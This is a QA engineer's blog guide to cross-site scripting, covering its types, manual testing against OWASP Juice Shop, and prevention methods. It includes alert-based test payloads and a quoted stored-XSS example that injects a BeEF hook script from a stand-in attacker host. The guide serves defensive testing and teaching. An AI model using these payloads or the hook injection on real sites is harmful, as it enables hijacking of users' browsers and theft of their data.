{
  "author": "Sean Moore",
  "domains": ["dev_quality_assurance"],
  "language": "en",
  "bgImg": "https://assets.website-files.com/5c4c30d0c49ea6746fafc90c/5f69ba3cacb840015aaad117_art-01.jpg",
  "authorImg": "https://assets.website-files.com/5c4c30d0c49ea6746fafc90c/5f69c242727b7bfd4b24c7d7_moore.jpg",
  "title": "Cross-Site Scripting (XSS): a QA Engineer's Guide",
  "position": "QA Engineer",
  "date": "Fri Aug 14 2020 10:05:48 GMT+0000 (Coordinated Universal Time)",
  "seoDescription": "After reading this article, you will have a general understanding of XSS, how to check for it, and how to prevent it.",
  "content": "<div class=\"max-w-full\">\n    <p>I decided to write this article because despite XSS being a common and older vulnerability, many QA and\n        developers know very little about it, what it really is, how to test for or fix it. Probably you've heard of\n        XSS before, but don't really know much about it. You may be wondering what Cross-Site Scripting is, why you\n        should test for it, or why it's important. Don't worry, we will cover everything you need to know in this\n        article. By the end, you will have a general understanding of XSS, how to check for it, and how to prevent it.\n        <br>In this article, we will address the following topics:<br></p>\n    <ul>\n        <li>What is XSS?</li>\n        <li>Why do you need to test for XSS vulnerabilities?</li>\n        <li>How to test for XSS?</li>\n        <li>Prevention methods</li>\n        <li>Summary</li>\n    </ul>\n    <h2>What is XSS?</h2>\n    <p>In short, XSS is a security vulnerability where an attacker injects their own client-side scripts into a\n        site.&nbsp <br></p>\n    <p>Let's take a look at a typical case for an XSS vulnerability using the image below and discuss what we see on\n        it.<br></p>\n    <figure class=\" w-richtext-figure-type-image w-richtext-align-fullwidth\n    \" style=\"max-width:1200px\">\n    <div><img src=\" https://uploads-ssl.webflow.com/5c4c30d0c49ea6746fafc90c/5f366da1e179ca5c5487ce23_wIU_4DfFrUMKTwmIM7qoJSGOR9zFJT8xS0FXJz3_flyDEYSOWyN137EA2lJmuPI4s2Mw7daOOl_g0QfYvvJMZqQtWPvKwKyClFUjdyA3Bvc59tEEKDliYDnUABlaSQm-IVntwATa.png\">\n    </div>\n    <figcaption><em>A visual representation of a typical XSS attack flow via email.</em></figcaption>\n    </figure>\n    <ol>\n        <li>Here, we have a case where an attacker has modified a link with malicious content. As an example, we can say\n            the link is for a video sharing site and has a keylogger attached to it. The attacker emails it to an\n            unsuspecting victim with an intriguing title 'Cutest cat ever'.&nbsp\n        </li>\n        <li>The victim opens the email and clicks the link.</li>\n        <li>The user is redirected to the actual video sharing site, and probably to a cute cat video. What the user\n            doesn't know is that a keylogger is being executed. Now anything the user types will be sent to an unknown\n            attacker.\n        </li>\n        <li>The data from the keylogger is sent to the attacker.<br></li>\n    </ol>\n    <p>Okay, so that's an interesting case for spam emails, but many people know not to select links from unknown\n        senders today, right? Let's look at one more typical case.&nbsp <br></p>\n    <figure class=\" w-richtext-figure-type-image w-richtext-align-fullwidth\n    \" style=\"max-width:1200px\">\n    <div><img src=\" https://uploads-ssl.webflow.com/5c4c30d0c49ea6746fafc90c/5f366da141480acf2ab8f9d4_ffCbT9ZWavqT3EnWuEmoblsHmGseY8uqtM8CndDGIgmdy-2oWNMFrfKu8fuAZNddYwzskMn1suqfaCkQeVepV1hrbDdT6hL50W5_EP1rfk4AGE6bV5vPJbz5aqhe3y4sJWuXTZ5J.png\">\n    </div>\n    <figcaption><em>An example of a stored XSS attack flow.</em></figcaption>\n    </figure>\n    <ol>\n        <li>In this situation, an attacker posts a comment on a site (such as a forum or social media page) which\n            contains malicious code.&nbsp\n        </li>\n        <li>The malicious code is saved to the site's database.</li>\n        <li>Later, a user visits the infected page.</li>\n        <li>The user's browser runs the malicious script.<br></li>\n    </ol>\n    <p>XSS can be broken down into three main types:<br>DOM-based XSS (common):&nbsp </p>\n    <ul>\n        <li>Attack is executed as a result of modifying the DOM.</li>\n        <li>Attacker modifies the client-side code.</li>\n    </ul>\n    <p>Reflected XSS (most common):</p>\n    <ul>\n        <li>Attacker modifies the webpage HTTP request with malicious content.</li>\n    </ul>\n    <p>Stored XSS (most severe):&nbsp </p>\n    <ul>\n        <li>Attacker saves malicious content on the site's DB which can be run by other users.<br></li>\n    </ul>\n    <p>For this article, we are going to focus on the basic flows for manual testing each type of XSS vulnerability.<br>\n    </p>\n    <figure class=\" w-richtext-figure-type-image w-richtext-align-fullwidth\n    \" style=\"max-width:1200px\">\n    <div><img src=\" https://uploads-ssl.webflow.com/5c4c30d0c49ea6746fafc90c/5f366da25c702f8d7932f10a_4VQSX6wMY9roBktyIlD8TFERsNjpn-wDevjm5TMZQtCvpqXlOtm8qMaoaU0QKgcBQ8JwDL1xUL7IlTgx4BAz1CVLC0otC6MbX6PrSaY0DxDlJPupEO_uoPaB02gU2p0S3MP2_bW4.png\">\n    </div>\n    </figure><h2>Why do we need to test for XSS vulnerabilities?</h2>\n    <p>Cross-site scripting is nothing new, yet it remains a very common security vulnerability. It consistently gets\n        itself on the <a href=\" https://owasp.org/www-project-top-ten/\">OWASP Top 10 Web Application Security\n        Risks</a>.<br>XSS attacks can be used to:</p>\n    <ul>\n        <li>Steal user data</li>\n        <li>Escalate privileges</li>\n        <li>Add a keylogger</li>\n        <li>Hijack accounts</li>\n        <li>Distribute a virus</li>\n        <li>Change a site's layout</li>\n        <li>Add a trojan login panel</li>\n        <li>And many other client-side attacks<br></li>\n    </ul>\n    <p>Potential costs of XSS vulnerabilities:</p>\n    <ul>\n        <li>Loss of money</li>\n        <li>Loss of customers</li>\n        <li>Reputation</li>\n        <li>Loss of sales</li>\n        <li>Data theft<br></li>\n    </ul>\n    <p>The cost of an XSS vulnerability can be hard to gauge as it could be different for different sites. <br>As an\n        example, let's say we have an e-commerce store with an unprotected comments section for each product. An\n        attacker leaves a comment with a malicious link to another product on the site. Now, any user who selects this\n        link will execute the malicious code. If this code were a keylogger, then the users potentially give away their\n        login to the site, their credit/debit card information, their address, and other personal information. Because\n        users will now see the site as unsafe and possibly had their information or even money stolen, the potential\n        costs here could be loss of reputation, loss of customers, data theft (for customers), loss of sales, and\n        ultimately loss of money.&nbsp </p>\n    <h2>How do we test for XSS vulnerabilities?</h2>\n    <p>There are two ways to test for these risks, manually or with automated tools.<br></p>\n    <p>Testing manually can be very time-consuming, difficult, and somewhat unreliable. However, it's a good place to\n        start, especially if you don't have access to the tools you need.&nbsp <br></p>\n    <p>Automated tools are very useful in identifying possible vulnerabilities as well as testing browser hijacking.\n        There are many tools available for this, but many of them are not free and can be quite expensive. Luckily,\n        there are two free tools available which will cover your XSS testing needs:<br></p>\n    <ol>\n        <li><a href=\" https://www.zaproxy.org/\">OWASP ZAP</a> (Zed Attack Proxy) - a free tool provided by OWASP. It\n            has a combination of built-in tools and can be used for manual or automated testing.\n        </li>\n        <li>\"<a href=\" https://beefproject.com/\">BeEF</a> (Browser Exploitation Framework Project) - a free\n            pentesting tool which focuses on testing the web browser.<br></li>\n    </ol>\n    <p>We also need to note that you should never run actually malicious code or code that you don't understand.\n        Always use harmless code which you fully understand.<br></p>\n    <p>Now, let's proceed with learning how to test for each type of XSS vulnerability, as promised.</p>\n    <h3>Testing for DOM-based XSS</h3>\n    <p>Let's see how to test for DOM-based XSS by becoming the attacker. The first thing you need to do is look for an\n        input field. This could be a comments section, search bar, or any place where the input is displayed after\n        submission. Then, just type something that's expected for this field (i.e. a typical search or comment) and\n        check the normal output. Next, make a series of submissions with different scripts attached and check the output\n        against the original. It's best to start with something simple, like <strong>&lt h1&gt </strong> as it will\n        tell you if the field allows special characters and runs the user's HTML. Repeat this process until you either\n        find a vulnerability or are satisfied that the input isn't at risk.<br>Let's take this one step further by\n        breaking down each step while looking at an example. For this example, we decided to use an application provided\n        by OWASP called OWASP Juice Shop. It is set up like a typical e-commerce site.<br><strong>Step 1: Find an input\n            field.&nbsp </strong>\"</p>\n    <p>Here we can see that there's a search bar, we will start there.<br></p>\n    <figure class=\" w-richtext-figure-type-image w-richtext-align-center\n    \">\n    <div><img src=\" https://uploads-ssl.webflow.com/5c4c30d0c49ea6746fafc90c/5f366da269768da8652a4b39__rGoPEGzFyxyZfRxAPaAsAgFeer9ZjcXrmZQBXODWWNeRWCQBS7X6MaaQL6eoMNTZiAVh0BWZ-HmDJBSyu696jhvp20ybhR8cz35roiIbOu-Af-RIbTi2Wy4EXb_XyC4NpfpcpNM.png\">\n    </div>\n    </figure><p><br></p>\n    <p><strong>Step 2: Check the normal output of this field.</strong> <br>We'll make a simple search for \"apple\"\n        and check the output.&nbsp <br></p>\n    <figure class=\" w-richtext-figure-type-image w-richtext-align-center\n    \">\n    <div><img src=\" https://uploads-ssl.webflow.com/5c4c30d0c49ea6746fafc90c/5f366da150972d7e426336cc_sWeKBHf3Sucw3O2yDL9Hz0LNZRp9xs9undm-ScSGZXJa9b4vMHOnYWq9NJM9rayLLzukqeRyLvqRLBa0wMFdVG3YCdgnRm5TNreMxir-OpzbZLcnSKN__GfJbj9ZUBdJLtlZumez.png\">\n    </div>\n    </figure><p><br></p>\n    <p><strong>Step 3: Try a simple HTML tag</strong>.<br>Now, we will slightly change our search to <strong>&lt h1&gt\n        apple</strong>. This is a quick way to determine if an input needs further testing. If the output is modified,\n        then there is a high probability that more complex scripts will run. That being said, a lack of change in the\n        output doesn't mean that the input is safe.&nbsp <br></p>\n    <figure class=\" w-richtext-figure-type-image w-richtext-align-center\n    \">\n    <div><img src=\" https://uploads-ssl.webflow.com/5c4c30d0c49ea6746fafc90c/5f366da22add8d19a1319043_Z3CqftxBaSp5UAk4auW7R0_3SZPh54GMlwAX5deX21wuhB-VOQjn-p7vKfn33DKQwbyQ6g3RsDHqF7vx_EkA8x-nPnnkOX9epjEcmDLJj4xh3oh05cWtsV9z2RsHooALYKAcN_E3.png\">\n    </div>\n    </figure><p><br></p>\n    <p>Look at that! The output is different than before! This tells us that we definitely need to spend more time\n        testing this input.<br><strong>Step 4: Try more complex scripts</strong>.</p>\n    <p>Now that we have a good reason to continue testing this input, let's try again with another script. There are\n        many scripts you could choose from, but I find that it's easier to use those which will produce an alert on\n        the screen. That is why we will try <strong>&lt script&gt alert(\"XSS\")&lt /script&gt apple</strong>.<br></p>\n    <figure class=\" w-richtext-figure-type-image w-richtext-align-center\n    \">\n    <div><img src=\" https://uploads-ssl.webflow.com/5c4c30d0c49ea6746fafc90c/5f366da1de3f7057cde5ffda_ipDUDgMKrmu9YCYviBAJg5qmOQIjC6CACi2s4pEtTrmRYGcN5TlgaNbCVzQ3k2msXX6skGxkn8v-bD7rfLsm1TBIkN7PlCCGuNwz3rp56i-XL44StyIyx_7EhMKzJlev6_3QKJrw.png\">\n    </div>\n    </figure><p><br></p>\n    <p>Ok, so that didn't work. But we can't give up so easily. Let's try another!<br><strong>Repeat Step 4: Try\n        another script</strong>.<br>This time we'll try <strong>&lt img src=\"\" onerror=alert('XSS')&gt\n        apple</strong>.<br></p>\n    <figure class=\" w-richtext-figure-type-image w-richtext-align-center\n    \">\n    <div><img src=\" https://uploads-ssl.webflow.com/5c4c30d0c49ea6746fafc90c/5f366da2ef0245316890163b_cDFHUZwHZoaS-NMMRKBTJ8xfS5s7-4Hah3s-nW4ajFoIwcTMt1BS11ZHMHFnrK1pbXXb382dtcJoA-cT9pjUrNNezn5WKGf8Mb5FQPvIRVQj1gSO2QeGebJ5WvzWvjbtKKOiApAD.png\">\n    </div>\n    </figure><p><br></p>\n    <p>Woah! Notice how this time we were able to add a broken image to the page. That's great, but our alert still\n        didn't appear. We need to keep trying.<br><br><strong>Repeat Step 4: Try another script</strong>.</p>\n    <p>Now we will try <strong>&lt iframe src=\"javascript:alert(`xss`)\"&gt apple</strong>.<br></p>\n    <figure class=\" w-richtext-figure-type-image w-richtext-align-center\n    \">\n    <div><img src=\" https://uploads-ssl.webflow.com/5c4c30d0c49ea6746fafc90c/5f366da2fa45d01b8d8eea65_gk8HsgxR5pkEkZPja5L00dmGwEV4bAImkUIXjBEUEg8csKO1p2z69xz3tJCrNzS5HPtND3DHTX0008HVwzM5YHZKjuacOWr1JmD8_DMmmAx_xXr_9OM5_P5-NTzQYDD4gcu-OZnk.png\">\n    </div>\n    </figure><p><br></p>\n    <p>Finally! We have injected an iframe into the DOM and successfully run the corresponding alert script. <br></p>\n    <p>If you look closely at the scripts we used, you'll notice that we used different combinations of single quotes,\n        double quotes, and back-ticks.&nbsp </p>\n    <p></p>\n    <p>&lt script&gt alert(\"XSS\")&lt /script&gt </p>\n    <p>&lt img src=\"\" onerror=alert('XSS')&gt </p>\n    <p>&lt iframe src=\"javascript:alert(`xss`)\"&gt </p>\n    <p></p>\n    <p>This isn't just for fun, sometimes every detail matters, including font! That's why it's best to start\n        small - you never know which characters will be accepted. If you want to try this for yourself, you can\n        practice the same example on the <a href=\" https://owasp.org/www-project-juice-shop/\">OWASP Juice Shop</a>\n        testing site.</p>\n    <h3>Testing for reflected XSS</h3>\n    <p>For reflected XSS, we need to find places where user input is reflected on the page. Next, test it's normal\n        output. Then, slowly try to manipulate these variables (or even the URL itself) until you succeed or are\n        satisfied that there isn't a vulnerability.<br>Let's take a look at an example.<br><strong>Step 1: Find an\n            input field or URL variable which reflects user input.<br>Step 2: Check the normal output.</strong></p>\n    <p>Here we have a simple site which welcomes the user with their name and displays a link.&nbsp <br></p>\n    <figure class=\" w-richtext-figure-type-image w-richtext-align-center\n    \">\n    <div><img src=\" https://uploads-ssl.webflow.com/5c4c30d0c49ea6746fafc90c/5f366da33bea2a7a56161e53_hxunvZOnEKcFVPiMzrLx-EBdYsyOYwtgCL70MhI3FnOw4ZFvuRnm6Sz4vittiPCOr0WzOV60dRycPJxvgls9NYs-GlUBFAbEKeCY-or9gEUKDgwP_ExOLwurHEN1gFpkXPKxy2nM.png\">\n    </div>\n    <figcaption><em>This example is provided by the </em><a href=\" https://owasp.org/www-project-web-security-testing-guide/\"><em>OWASP\n        testing guide</em></a><em>.</em></figcaption>\n    </figure><p>\"<br>We can see already that there's a variable (query parameter) in the HTTP request which is\n    displayed on the <strong>page(user=MySmith)</strong> - we will start by using this variable to attack the\n    page.&nbsp <br></p>\n    <p><strong>Step 3: Try something simple.</strong></p>\n    <p>As with DOM XSS, start small and simple.<strong>\"<br>Step 4: Try something more complex.</strong></p>\n    <p>Now we'll try more complex scripts and check the output. For this example, we will modify the URL directly,\n        rather than messing with the input field. We will replace <strong>user=MrSmith\" </strong>with<strong>\n            \"user=&lt script&gt alert(123)&lt /script&gt </strong>.<br></p>\n    <figure class=\" w-richtext-figure-type-image w-richtext-align-center\n    \">\n    <div><img src=\" https://uploads-ssl.webflow.com/5c4c30d0c49ea6746fafc90c/5f3a386d18ce2431beea9182_Screenshot%20(4).png\">\n    </div>\n    <figcaption><em>This example is provided by the </em><a href=\" https://owasp.org/www-project-web-security-testing-guide/\"><em>OWASP\n        testing guide.</em></a><br></figcaption>\n    </figure><p>\"<br>Success! As you can see, the script was executed in the user's browser. We also want to draw\n    your attention to the fact that the original webpage looks normal - a user would have no idea they executed\n    malicious code if we weren't using an alert function.</p>\n    <h3>Testing for stored XSS</h3>\n    <p>The steps for testing stored XSS are pretty much the same as for DOM-based XSS.&nbsp <br><strong>Step 1: Find an\n        input field.</strong><br><strong>Step 2: Check the normal output of this field.</strong><br><strong>Step 3: Try\n        something simple.<br>Step 4: Try more complex scripts, repeat.</strong><br></p>\n    <p>In general, you should check:<br></p>\n    <ul>\n        <li>Any place where user input is saved to the DB (like user profiles, comments, file uploads, shopping carts)\n        </li>\n        <li>GET, POST, PUT requests</li>\n        <li>The ability to manipulate the page's HTML</li>\n        <li>The ability to store malicious content somewhere public</li>\n        <li>The ability to replace the page's links<br></li>\n    </ul>\n    <p>Let's take a look at one example of a test using the BeEF tool, which was provided by the <a href=\" https://owasp.org/www-project-web-security-testing-guide/\">OWASP\n        testing guide</a>. A typical test scenario would be:<br></p>\n    <ul>\n        <li>Injecting a JavaScript hook which communicates to the attacker's browser exploitation framework (BeEF).\n            Example BeEF Injection in index2.php can be:<br></li>\n    </ul>\n    <p></p>\n    <p>email@test.com\"&gt &lt script src=http://attackersite/beef/hook/beefmagic.js.php&gt &lt /script&gt </p>\n    <p></p>\n    <ul>\n        <li>Waiting for the application user to view the vulnerable page where the stored input is displayed&nbsp</li>\n        <li>Control the application user's browser via the BeEF console&nbsp <br></li>\n    </ul>\n    <p>With the example above, an attacker could add a script to their own email on the webpage. This could possibly be\n        done during registration or with updating a user profile. Then, any user who views a page, that runs this\n        malicious code, is now a potential victim as their browsers can now be controlled by the attacker.</p>\n    <h2>How do we prevent or fix XSS vulnerabilities?</h2>\n    <p>There are many different ways to prevent such vulnerabilities. You will need to choose based on your project and\n        it's needs. The best defense is a combination of methods.<br></p>\n    <p><strong>Prevention methods</strong>:<br></p>\n    <ul>\n        <li><strong>#1 rule: Don't trust your users!</strong> Trusting users, even logged-in or admin users, leads to\n            many security vulnerabilities - just don't do it. What do I mean when I say not to trust the users? I\n            mean that you should treat all fields as potential attack targets. Maybe there is a field or form that only\n            an app admin can access - who is this admin? Do you know how secure their password is? You don't know\n            - and there is always the possibility that this admin, or an attacker who stole the admin's login\n            credentials, could place malicious code anywhere. So, protect all inputs and treat all users as a possible\n            threat.&nbsp\n        </li>\n        <li><strong>Enable a Content Security Policy (</strong><a href=\"\n                                                                  https://content-security-policy.com/\"><strong>CSP</strong></a>\n            <strong>) </strong>- an HTTP response header that works to reduce the risk of XSS vulnerabilities.\n        </li>\n        <li><strong>Use frameworks and/or libraries</strong>. Many modern frameworks and libraries have built-in\n            security to reduce XSS risks.&nbsp\n        </li>\n        <li><a href=\" https://en.wikipedia.org/wiki/Escape_character\"><strong>Escape</strong></a><strong> special\n            characters</strong> - replace them with something else which prevents the malicious code from running.\n        </li>\n        <li><strong>Encode data</strong></li>\n        <li><strong>Filter data on input</strong> to remove dangerous content before saving it to the database.</li>\n        <li><a href=\"\n               https://wiki.sei.cmu.edu/confluence/display/java/Input+Validation+and+Data+Sanitization\"><strong>Sanitize</strong></a>\n            <strong> data (on input and output)</strong> to ensure that the passed data meets security requirements by\n            means of removing, escaping, encoding, or replacing special characters. It's important to sanitize data on\n            input to prevent saving malicious content to the database and on output to prevent malicious code execution\n            in the browser.\n        </li>\n        <li><strong>Use HTTPS header instead of HTTP</strong>. Hint: the 'S' means 'Secure'. This protection is\n            excellent for preventing reflected XSS vulnerabilities.\n        </li>\n        <li><strong>Protect cookies with 'secure' and 'HTTPonly'.</strong></li>\n        <li><strong>Use black lists or white lists. </strong>It's better to use whitelisting because it's impossible\n            to blacklist all unwanted content.\n        </li>\n        <li>And many other options... Here at Valor Software, we use a unique combination of protection methods for each\n            project, based on needs, to ensure stable security for our customers.<br></li>\n    </ul>\n    <p>It's important to use a combination of prevention methods to ensure your site is secure. Using only one or two\n        methods isn't enough. For example, character escaping can be seen by the attacker, and with time they could\n        find a way to bypass the escaping method. So, it's why you need a combination of protection methods on user\n        input and output.</p>\n    <h2>Summary</h2>\n    <p>Let's sum up everything.</p>\n    <p>XSS is a common and serious security vulnerability. We covered what XSS can be used to do, how XSS can harm a\n        person, or business, and what the potential costs are. We took a look at the three main types of XSS\n        vulnerabilities, how they work, and how to test for them.<br></p>\n    <p>General manual testing flow for various XSS vulnerabilities is:<br></p>\n    <ol>\n        <li>Find an input field.</li>\n        <li>Check normal output.</li>\n        <li>Check output with code - remembering to start small.</li>\n        <li>Repeat with other codes until success or you're confident in the level of security.<br></li>\n    </ol>\n    <p>We also discussed, and perhaps experienced, how manual security testing is very time-consuming, so it's best to\n        use automated tools whenever possible. Finally, we reviewed XSS prevention methods and why the best protection\n        is a combination of several methods. <br>As promised, you should now have a general understanding of this\n        vulnerability, how to test for it, and how to prevent it.<br>\n    </p>\n\n\n</div>"
}